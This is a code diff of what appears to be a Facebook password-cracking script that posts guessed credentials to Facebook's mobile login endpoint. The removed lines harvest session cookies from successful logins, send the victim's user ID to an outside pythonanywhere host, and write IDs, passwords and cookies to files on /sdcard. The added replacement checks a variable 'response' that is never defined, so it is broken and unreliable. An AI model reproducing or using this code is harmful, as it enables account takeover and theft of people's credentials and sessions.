@@ -1233,34 +1233,16 @@ def m6(idf,pw):
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
-   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
-   log_cookies=session.cookies.get_dict().keys()
-   if 'c_user' in log_cookies:
-    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-    user = re.findall('c_user=(.*);xs', coki)[0]
-    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
-    reqx = requests.get(url).text
-    if 'live' in reqx:
-            print(f'\r\r{G}[ATOM-OK]: {user} | {ps}')
-            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOMb-M6-live-OK','a').write(user+'|'+ps+'|'+coki+'\n')
-            ok+=1 
-            break
-    if 'lock' in reqx:
-            print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
-            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOMb-M6-live-OK','a').write(user+'|'+ps+'|'+coki+'\n')
-            ok+=1 
-            break
-   elif 'checkpoint' in log_cookies:
-    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-    coki1 = coki.split("1000")[1]
-    uid = "1000"+coki1[0:11]
-    if 'y' in cp_xdx:
-     print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{ps}{xxx}')
-    open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
-    cp.append(uid)
+   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb)
+   if response.status_code == 200:
+    if 'login_error' in response.text or 'Invalid username or password' in response.text:
+        print(f"Login failed for ID: {idf} with Password: {ps}")
+    elif 'logout' in response.url or 'profile' in response.text:  # Simplistic check for login success
+        print(f"Successful login for ID: {idf} with Password: {ps}")
+    else:
+        print(f"Login result is unclear. Status code: {response.status_code}")
    else:
+    print(f"Failed to login. Status code: {response.status_code}")
     continue
   loop+=1
   
